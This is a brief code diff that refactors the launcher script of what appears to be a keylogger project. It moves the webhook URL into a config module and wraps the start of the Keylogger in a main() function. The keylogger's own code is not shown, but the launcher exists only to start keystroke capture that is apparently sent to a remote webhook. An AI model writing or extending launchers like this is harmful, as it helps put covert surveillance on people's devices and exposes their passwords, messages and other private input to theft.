@@ -1,6 +1,9 @@
+import config
 from keylogger import Keylogger
 
-WEBHOOK_URL = ""
+def main():
+    kl = Keylogger(config.WEBHOOK_URL)
+    kl.start()
 
-my_keylogger = Keylogger(interval=60, webhook_url=WEBHOOK_URL)
-my_keylogger.start()
+if __name__ == "__main__":
+    main()
